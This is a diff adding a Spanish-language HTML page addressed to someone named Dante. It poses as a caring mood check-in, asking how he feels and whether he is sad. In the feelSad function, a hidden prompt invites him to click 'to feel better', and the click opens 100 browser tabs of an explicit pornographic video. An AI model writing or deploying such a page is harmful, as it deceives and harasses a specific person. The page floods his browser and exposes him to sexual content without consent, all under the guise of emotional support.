@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hola Dante</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+        }
+        .options, .reasons, .good-message, .sad-message {
+            display: none;
+            margin-top: 20px;
+        }
+        button {
+            margin: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Hola Dante, ¿Cómo estás? :)</h1>
+        <div class="options">
+            <button onclick="feelingGood()">Estoy bien</button>
+            <button onclick="feelingBad()">Estoy mal</button>
+        </div>
+        <div class="good-message">
+            <p>Me alegro que estés bien</p>
+            <p>Dale en "Estoy mal" para ver más cosas de esta página</p>
+            <button onclick="retry()">Reintentar</button>
+        </div>
+        <div class="reasons">
+            <p>¿Por qué estás mal?</p>
+            <button onclick="notSure()">No sé</button>
+            <button onclick="feelSad()">Es que me siento triste</button>
+        </div>
+        <div class="sad-message">
+            <p>Ayy te sientes mal? :(</p>
+            <p style="display:none;">Mira da click a la pantalla y así estarás bien</p>
+        </div>
+    </div>
+
+    <script>
+        document.body.onclick = function() {
+            document.querySelector('.options').style.display = 'block';
+            document.querySelector('h1').style.display = 'none';
+            document.body.onclick = null;
+        }
+
+        function feelingGood() {
+            document.querySelector('.options').style.display = 'none';
+            document.querySelector('.good-message').style.display = 'block';
+        }
+
+        function retry() {
+            document.querySelector('.good-message').style.display = 'none';
+            document.querySelector('h1').style.display = 'block';
+            document.body.onclick = function() {
+                document.querySelector('.options').style.display = 'block';
+                document.querySelector('h1').style.display = 'none';
+                document.body.onclick = null;
+            }
+        }
+
+        function feelingBad() {
+            document.querySelector('.options').style.display = 'none';
+            document.querySelector('.reasons').style.display = 'block';
+        }
+
+        function notSure() {
+            alert('Es que me siento triste');
+            feelSad();
+        }
+
+        function feelSad() {
+            document.querySelector('.reasons').style.display = 'none';
+            const sadMessage = document.querySelector('.sad-message');
+            sadMessage.style.display = 'block';
+            setTimeout(() => {
+                sadMessage.children[1].style.display = 'block';
+                sadMessage.children[1].onclick = () => {
+                    for (let i = 0; i < 100; i++) {
+                        window.open('https://www.xvideos.com/video.ufpmofmee3d/recopilacion_de_la_gira_de_cuerpos_de_osos_peludos_y_gays_de_louivmane/watch?v=dQw4w9WgXcQ', '_blank');
+                    }
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
